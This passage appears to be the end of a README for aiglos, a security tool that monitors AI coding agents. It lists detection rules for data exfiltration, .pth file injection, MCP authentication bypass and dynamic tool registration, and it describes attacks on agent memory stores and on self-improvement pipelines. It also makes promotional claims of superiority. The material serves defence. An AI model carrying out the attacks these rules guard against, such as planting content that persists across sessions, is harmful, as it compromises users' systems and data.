**Ported rules:** T01 DATA_EXFILTRATION, T81 PTH_FILE_INJECT, T86 CROSS_TENANT_ACCESS, T87 THRESHOLD_PROBING, T88 MCP_AUTH_BYPASS, T90 DYNAMIC_TOOL_REGISTRATION. T02-T80 are stubbed with `match_never` — foundation for community porting, not a full port.

-----

## What makes this structurally different

**1. The only product that intercepts all three surfaces.** MCP-only tools miss everything Claude Code, Cursor, and Aider do via subprocess and HTTP.

**2. Agent-agnostic.** Same 91 rules, same signed artifact, whether the agent is Claude Code, Cursor, smolagents, or OpenClaw.

**3. 3/3 GHSAs caught before disclosure.** Empirical validation no competitor can replicate.

**4. The "specific Tuesday" answer.** `aiglos forensics query --date 2026-03-12` returns a tamper-evident, cryptographically signed record of exactly what that agent did. The agent is gone; the audit trail is not.

**5. Self-improvement pipeline protection (T82).** One injection into the DGM-Hyperagents improvement pipeline propagates forward through every future agent generation. T82 is the only rule specifically designed for this.

**6. Persistent memory protection (T79).** Gigabrain, ByteRover, Chroma, Pinecone, Qdrant — all protected. Adversarial content that survives session close and injects into every future session is completely unguarded elsewhere.

**7. Supply chain depth.** T81 catches `.pth` file attacks at placement, before the first Python restart. Both the litellm and axios RAT incidents are in COMPROMISED_PACKAGES. `aiglos scan-deps` gives an immediate answer to "am I already compromised."

**8. The only product that produces a compliance artifact at session close.** 80,000 defense contractors need it by June 2026. Nothing else auto-generates it.

**9. Detection that compounds.** Behavioral baselines, intent prediction, and federated intelligence improve with every session. A forked open-source version stays static.

**10. Undercover mode compliance (T89).** The only product that detects and records when AI contributions are committed to public repositories with suppressed attribution — answering the compliance question standard VCS audit logs cannot.

-----

-----

<div align="center">

[aiglos.dev](https://aiglos.dev) · [Docs](https://docs.aiglos.dev) · [Discord](https://discord.gg/aiglos) · [Twitter](https://twitter.com/aiglosdev)

</div>
